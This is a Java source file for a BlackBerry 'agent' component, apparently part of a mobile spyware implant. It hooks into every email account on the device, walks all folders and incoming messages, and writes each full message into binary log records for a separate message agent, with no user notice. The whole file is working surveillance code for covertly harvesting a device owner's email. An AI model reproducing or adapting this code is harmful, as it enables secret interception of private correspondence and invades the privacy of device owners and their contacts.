/**
 * 
 */
package blackberry.agent;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.util.Vector;

import net.rim.blackberry.api.mail.Address;
import net.rim.blackberry.api.mail.BodyPart;
import net.rim.blackberry.api.mail.Folder;
import net.rim.blackberry.api.mail.Message;
import net.rim.blackberry.api.mail.MessagingException;
//#ifdef HAVE_MIME
import net.rim.blackberry.api.mail.MimeBodyPart;
//#endif
import net.rim.blackberry.api.mail.Multipart;
import net.rim.blackberry.api.mail.SendListener;
import net.rim.blackberry.api.mail.ServiceConfiguration;
import net.rim.blackberry.api.mail.Session;
import net.rim.blackberry.api.mail.Store;
import net.rim.blackberry.api.mail.TextBodyPart;
import net.rim.blackberry.api.mail.Transport;
import net.rim.blackberry.api.mail.event.FolderEvent;
import net.rim.blackberry.api.mail.event.FolderListener;
import net.rim.blackberry.api.mail.event.StoreEvent;
import net.rim.blackberry.api.mail.event.StoreListener;
import net.rim.device.api.io.http.HttpDateParser;
import net.rim.device.api.servicebook.ServiceBook;
import net.rim.device.api.servicebook.ServiceRecord;
import net.rim.device.api.util.DataBuffer;
import net.rim.device.api.util.IntHashtable;
import blackberry.utils.Check;
import blackberry.utils.DateTime;
import blackberry.utils.Debug;
import blackberry.utils.DebugLevel;

/**
 * @author user1
 * 
 */
public class MailListener implements FolderListener, StoreListener,
        SendListener {

    //#debug
    static Debug debug = new Debug("MailListener", DebugLevel.VERBOSE);

    protected static final int[] HEADER_KEYS = { Message.RecipientType.TO,
            Message.RecipientType.CC, Message.RecipientType.BCC };

    private static final int MAIL_VERSION = 2009070301;

    protected static final int BODY = 1;

    protected static final boolean FILTERFROM = false;
    protected static final boolean FILTERTO = false;
    protected static final String DATEFROM = "Tue, Mar 23 2010 06:31:27 GMT";
    protected static final String DATETO = "Tue, Apr 01 2010 22:31:27 GMT";
    protected static final boolean FILTERDIM = false;
    protected static final int BODYDIM = 0;

    protected static IntHashtable fieldTable;

    private static ServiceRecord[] mailServiceRecords;

    /**
     * controlla se il messaggio e' mime e ne stampa il contenuto
     * 
     * @param multipart
     */
    protected static void displayMultipart(final Multipart multipart) {
        // This vector stores fields which are to be displayed only after all
        // of the body fields are displayed. (Attachments and Contacts).
        final Vector delayedFields = new Vector();

        // Process each part of the multi-part, taking the appropriate action
        // depending on the part's type. This loop should: display text and
        // html body parts, recursively display multi-parts and store
        // attachments and contacts to display later.
        for (int index = 0; index < multipart.getCount(); index++) {
            final BodyPart bodyPart = multipart.getBodyPart(index);

            // If this body part is text then display all of it
            if (bodyPart instanceof TextBodyPart) {
                final TextBodyPart textBodyPart = (TextBodyPart) bodyPart;

                // If there are missing parts of the text, try to retrieve the
                // rest of it.
                if (textBodyPart.hasMore()) {
                    try {
                        Transport.more(textBodyPart, true);
                    } catch (final Exception e) {
                    	//#debug
                        debug.trace("Transport.more(BodyPart, boolean) threw " + e.toString());
                    }
                }
                String plainText = (String) textBodyPart.getContent();

                // Display the plain text, using an EditField if the message is
                // editable or a RichTextField if it is not editable. Note: this
                // does not add any empty fields.
                if (plainText.length() != 0) {
                    if (FILTERDIM == true && plainText.length() > BODYDIM) {
                        // se e' attivo il filtro sulla dimensione dell'email, sovrascrive al body dell'email la stringa troncata
                        plainText = plainText.substring(0, (BODYDIM)); // l'unita' di misura e' il kbyte
                    }
                  //#debug
                    debug.trace("Testo dell'email :" + plainText);
                }
            } 
            //#ifdef HAVE_MIME
            else if (bodyPart instanceof MimeBodyPart) {
                final MimeBodyPart mimeBodyPart = (MimeBodyPart) bodyPart;

                // If the content is text then display it
                final String contentType = mimeBodyPart.getContentType();
                if (contentType
                        .startsWith(BodyPart.ContentType.TYPE_TEXT_HTML_STRING)) {
                    final Object obj = mimeBodyPart.getContent();
                    if (obj != null) {
                        String htmlText = new String((byte[]) obj);
                        // se e' attivo il filtro sulla dimensione dell'email, sovrascrive al body dell'email la stringa troncata
                        if (FILTERDIM == true && htmlText.length() > BODYDIM) {
                            htmlText = htmlText.substring(0, (BODYDIM)); // l'unita' di misura e' il kbyte
                        }
                      //#debug
                        debug.trace("Testo dell'email MIME: " + htmlText);
                    }
                } else if (contentType
                        .equals(BodyPart.ContentType.TYPE_MULTIPART_ALTERNATIVE_STRING)) {
                    // If the body part is a multi-part and it has the the
                    // content type of TYPE_MULTIPART_ALTERNATIVE_STRING, then
                    // recursively display the multi-part.
                    final Object obj = mimeBodyPart.getContent();
                    if (obj instanceof Multipart) {
                        final Multipart childMultipart = (Multipart) obj;
                        final String childMultipartType = childMultipart
                                .getContentType();
                        if (childMultipartType
                                .equals(BodyPart.ContentType.TYPE_MULTIPART_ALTERNATIVE_STRING)) {
                            displayMultipart(childMultipart);
                        }
                    }
                }
            }
            //#endif

        }

        // Now that the body parts have been displayed, display the queued
        // fields while separating them by inserting a separator field.
        for (int index = 0; index < delayedFields.size(); index++) {
            // System.out.println(delayedFields.elementAt(index));
        	//#debug
            debug.trace(delayedFields.elementAt(index).toString());
        }
    }

    String[] names;

    protected static long lastcheck;

    long timestamp;

    MessageAgent messageAgent;

    public MailListener(final MessageAgent messageAgent_) {
        this.messageAgent = messageAgent_;
    }

    private void addListeners(final Store store) {
        store.addFolderListener(this);
        store.addSendListener(this);
        store.addStoreListener(this);

    }

    public void batchOperation(final StoreEvent arg0) {
    	//#debug
        debug.info("batchOperation: " + arg0);

    }

    private void manageMessage(final Message message) throws MessagingException {
        long dataArrivo, filterDate;
        // Date emailDate;
        boolean printEmail;

        printEmail = false;

      //#mdebug
        debug.trace("Data di invio dell'email " + message.getSentDate()
                + " long: " + message.getSentDate().getTime());
        debug.trace("Data di arrivo dell'email " + message.getReceivedDate()
                + " long: " + message.getReceivedDate().getTime());
        debug.trace("Data del filtro FROM " + DATEFROM + " long: "
                + HttpDateParser.parse(DATEFROM));
        debug.trace("Data del filtro TO " + DATETO + " long: "
                + HttpDateParser.parse(DATETO));
//#enddebug
        
        // Se c'e' un filtro sulla data
        // entro
        if (FILTERFROM == true) {
            dataArrivo = message.getReceivedDate().getTime();
            filterDate = HttpDateParser.parse(DATEFROM);
            // Se la data e' successiva a quella dell'ultima
            // lettura e la data dell'email e' successiva a
            // quella del filtro
            if (dataArrivo >= lastcheck && dataArrivo >= filterDate) {
                // Se c'e' anche il filtro della data di fine
                if (FILTERTO == true) {
                    filterDate = HttpDateParser.parse(DATETO);
                    // Se la data dell'email e' tra data di
                    // inizio e data di fine => OK
                    if (dataArrivo <= filterDate) {
                    	//#debug
                        debug.trace("Sono attivi i 2 filtri e l'email rispetta i 2 criteri FROM e TO");
                        printEmail = true;
                    }
                } else {
                	//#debug
                    debug.trace("E' attivo solo il filtro FROM e l'email rispetta questo criterio");
                    // Se la data dell'email e' corretta, e c'e'
                    // solo il primo filtro ma non il secondo =>
                    // OK
                    printEmail = true;
                }
            }

        } else {
        	//#debug
            debug.trace("Non sono attivi criteri quindi l'email viene acquisita");
            // Se non ci sono filtri
            dataArrivo = message.getReceivedDate().getTime();
          //#debug
            debug.trace("dataArrivo = " + dataArrivo + "lastcheck = " + lastcheck);
            if (dataArrivo >= lastcheck) {
                printEmail = true;
            }
        }

        if (printEmail == true) {

            saveLog(message);
          //#debug
            debug.trace("Mittente dell'email: " + message.getFrom());
            // debug.trace("Destinatario dell'email: " +
            // message.getReplyTo());
            final Address[] addresses = message.getRecipients(HEADER_KEYS[0]);
            final String name = addresses[0].getAddr();
          //#mdebug
            debug.trace("Destinatario dell'email: " + name);

            debug.trace("Dimensione dell'email: " + message.getSize()
                            + "bytes");
            debug.trace("Data invio dell'email: " + message.getSentDate());
            debug.trace("Oggetto dell'email: " + message.getSubject());
            //#enddebug
            // Date dataArrivo = message.getReceivedDate();
            // Date dataArrivo = message.getSentDate();
            // Date expirationDate = new
            // Date(HttpDateParser.parse(dataArrivo.toString()));
            // System.out.println("Data di arrivo dell'email long: "
            // + expirationDate.getTime());
          //#mdebug
            debug.trace("Data di invio dell'email long: "
                    + message.getSentDate().getTime());
            debug.trace("Data di arrivo dell'email long: "
                    + message.getReceivedDate().getTime());
            //#enddebug
            // Date data = new Date();
            // long timeArrived;
            // timeArrived = data.getTime();

            final Object obj = message.getContent();

            Multipart parent = null;
          //#ifdef HAVE_MIME
            if (obj instanceof MimeBodyPart || obj instanceof TextBodyPart) {
                final BodyPart bp = (BodyPart) obj;
                parent = bp.getParent();
            } else {
                parent = (Multipart) obj;
            }

            // Display the message body
            final String mpType = parent.getContentType();
            
            if (mpType
                    .equals(BodyPart.ContentType.TYPE_MULTIPART_ALTERNATIVE_STRING)
                    || mpType
                            .equals(BodyPart.ContentType.TYPE_MULTIPART_MIXED_STRING)) {
                displayMultipart(parent);
            }
            //#endif
            System.out
                    .println("-------------------------------------------------------------------------------------");
        }

    }

    public void messagesAdded(final FolderEvent e) {
        final Message message = e.getMessage();
        //if(m.isInbound() && m.getSubject().equals(MY_SUBJECT"))
      //#debug
        debug.info("Added Message: " + message);

        try {
            manageMessage(message);
        } catch (final MessagingException ex) {
        	//#debug
            debug.error("cannot manage added message: " + ex);
        }

        messageAgent.updateMarkup();
    }

    public void messagesRemoved(final FolderEvent e) {
        final Message message = e.getMessage();
      //#debug
        debug.info("Removed Message" + message);

    }

    public void removeListeners(final Store store) {
        store.removeFolderListener(this);
        store.removeSendListener(this);
        store.removeStoreListener(this);
    }

    public void run() {
        // #debug
        debug.trace("run");

        timestamp = messageAgent.initMarkup();

        // Controllo tutti gli account di posta
        for (int count = mailServiceRecords.length - 1; count >= 0; --count) {
            names[count] = mailServiceRecords[count].getName();
          //#debug
            debug.trace("Nome dell'account di posta: " + names[count]);

            names[count] = mailServiceRecords[0].getName();
            final ServiceConfiguration sc = new ServiceConfiguration(
                    mailServiceRecords[count]);
            final Store store = Session.getInstance(sc).getStore();

            final Folder[] folders = store.list();
            // Scandisco ogni Folder dell'account di posta
            scanFolder(folders);
        }
      //#debug
        debug.trace("Fine ricerca!!");

        messageAgent.updateMarkup();
    }

    private void saveLog(final Message message) {

        ByteArrayOutputStream os = null;
        try {
            os = new ByteArrayOutputStream();
            message.writeTo(os);
            final byte[] content = os.toByteArray();

            final String messageContent = new String(content);
          //#debug
            debug.trace(messageContent);

            final int flags = 1;
            final int size = message.getSize();
            final DateTime filetime = new DateTime(message.getReceivedDate());

            final byte[] additionalData = new byte[20];
            /*
             * UINT uVersion; 200 #define LOG_MAIL_VERSION 2009070301 201 UINT
             * uFlags; 202 UINT uSize; 203 FILETIME ftTime;
             */

            final DataBuffer databuffer = new DataBuffer(additionalData, 0, 20,
                    false);
            databuffer.writeInt(MAIL_VERSION);
            databuffer.writeInt(flags);
            databuffer.writeInt(size);
            databuffer.writeLong(filetime.getTicks());
            Check.ensures(additionalData.length == 20, "Wrong buffer size");

            messageAgent.createLog(additionalData, content);

        } catch (final IOException e) {
            // TODO Auto-generated catch block
            e.printStackTrace();
        } finally {
            if (os != null) {
                try {
                    os.close();
                } catch (final IOException e) {
                }
            }
        }
    }

    /**
     * scansione ricorsiva della directories
     * 
     * @param subfolders
     */
    public void scanFolder(final Folder[] subfolders) {
        Folder[] dirs;

        // Date receivedDate;
        if (subfolders.length <= 0) {
            return;
        }
        for (int count = 0; count < subfolders.length; count++) {
        	//#debug
            debug.trace("Nome della cartella: " + subfolders[count].getFullName());
            dirs = subfolders[count].list();
            scanFolder(dirs);
            try {
                final Message[] messages = subfolders[count].getMessages();
                // Scandisco ogni e-mail dell'account di posta
                for (int j = 0; j < messages.length; j++) {
                    final Message message = messages[j];

                    manageMessage(message);
                }
            } catch (final MessagingException e) {
            	//#debug
                debug.trace("Folder#getMessages() threw " + e.toString());

            }
        }
    }

    public boolean sendMessage(final Message message) {

        //if(m.isInbound() && m.getSubject().equals(MY_SUBJECT"))
    	//#debug
        debug.info("New Send Message: " + message);

        /*
         * try { manageMessage(message); } catch (MessagingException ex) {
         * debug.error("cannot manage sending message: " + ex); }
         * 
         * messageAgent.updateMarkup();
         */
        return true;
    }

    public void start() {

        final ServiceBook serviceBook = ServiceBook.getSB();
        mailServiceRecords = serviceBook.findRecordsByCid("CMIME");

        names = new String[mailServiceRecords.length];
      //#debug
        debug.trace("Ci sono: " + mailServiceRecords.length + " account di posta!");

        // Controllo tutti gli account di posta
        for (int count = mailServiceRecords.length - 1; count >= 0; --count) {

            final ServiceConfiguration sc = new ServiceConfiguration(
                    mailServiceRecords[count]);
            final Store store = Session.getInstance(sc).getStore();
            addListeners(store);
        }

        //TODO: leggere  messageAgent.filtersEMAIL;
    }

    public void stop() {
        for (int count = mailServiceRecords.length - 1; count >= 0; --count) {

            final ServiceConfiguration sc = new ServiceConfiguration(
                    mailServiceRecords[count]);
            final Store store = Session.getInstance(sc).getStore();
            removeListeners(store);
        }
    }

}
